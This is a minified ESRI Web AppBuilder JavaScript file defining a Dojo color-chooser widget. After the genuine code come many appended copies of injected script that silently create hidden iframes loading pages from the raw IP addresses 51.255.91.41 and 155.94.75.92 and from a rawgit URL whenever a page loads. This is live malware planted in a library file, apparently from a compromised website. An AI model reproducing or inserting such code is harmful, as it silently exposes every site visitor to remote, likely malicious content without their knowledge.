// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/Evented dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/_base/lang dojo/_base/html dojo/on dojo/query dojo/i18n dojo/_base/Color dijit/a11yclick dojo/i18n!dojo/nls/colors".split(" "),function(k,l,m,n,p,q,f,r,t,u,h,v){return l([m,n,p,k],{templateString:'\x3cdiv\x3e\x3cdiv class\x3d"dijitInline dijitColorPalette" role\x3d"grid"\x3e\x3ctable class\x3d"dijitPaletteTable" cellspacing\x3d"0" cellpadding\x3d"0" role\x3d"presentation"\x3e\x3ctbody data-dojo-attach-point\x3d"gridNode"\x3e\x3c/tbody\x3e\x3c/table\x3e\x3c/div\x3e\x3c/div\x3e',
baseClass:"jimu-color-chooser",declaredClass:"jimu.dijit.ColorChooser",uid:"",colorsArray:["white seashell cornsilk lemonchiffon lightyellow palegreen paleturquoise lightcyan lavender plum".split(" "),"lightgray pink bisque moccasin khaki lightgreen lightseagreen lightskyblue cornflowerblue violet".split(" "),"silver lightcoral sandybrown orange palegoldenrod chartreuse mediumturquoise skyblue mediumslateblue orchid".split(" "),"gray red orangered darkorange yellow limegreen darkseagreen royalblue slateblue mediumorchid".split(" "),
"dimgray crimson chocolate coral gold forestgreen seagreen blue blueviolet darkorchid".split(" "),"darkslategray firebrick saddlebrown sienna olive green darkcyan mediumblue darkslateblue darkmagenta".split(" "),"rgb(0,0,1) darkred maroon brown darkolivegreen darkgreen midnightblue navy indigo purple".split(" ")],postCreate:function(){this.inherited(arguments);this.colorTitleNls=u.getLocalization("dojo","colors");this._createColorsBlocks()},_createColorsBlocks:function(){this._row=this.colorsArray.length;
this._col=this.colorsArray[0].length;for(var c=0;c<this._row;c++)for(var a=f.create("tr",{role:"row"},this.gridNode),e=0;e<this._col;e++){var d=this.colorsArray[c][e],b=h.named[d],g="";b?g=d:"rgb(0,0,1)"===d&&(g="black",b="rgb(0,0,1)");d=this.colorTitleNls[g];b=(new h(b)).toString();this["record"+e]=f.create("td",{"class":"dijitPaletteCell","data-title":b,role:"gridcell"},a);var k=f.create("span",{"class":"dijitInline dijitPaletteImg"},this["record"+e]);f.create("img",{"class":"dijitColorPaletteSwatch",
src:require.toUrl("dojo/resources/blank.gif"),alt:d,title:d,"data-title":g,width:"16px",height:"16px",style:"background-color: "+b},k)}this.own(r(this.gridNode,v,q.hitch(this,this.onColorClick)))},onColorClick:function(c){for(var a=c.target;"TD"!==a.tagName;){if(!a.parentNode||a===this.gridNode)return;a=a.parentNode}a=f.getAttr(a,"data-title");a=(new h(a)).toString();this.setColor(a);c.stopPropagation();c.preventDefault()},_onChange:function(c){this.emit("change",c)},setColor:function(c,a){c=new h(c);
for(var e=null,d=t("td",this.domNode),b=0,g=d.length;b<g;b++)f.removeClass(d[b],"dijitPaletteCellSelected");b=0;for(g=d.length;b<g;b++)if(c.toString()===f.getAttr(d[b],"data-title")){e=d[b];break}e&&f.addClass(e,"dijitPaletteCellSelected");(e&&"undefined"===typeof a||!0===a)&&this._onChange(c)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});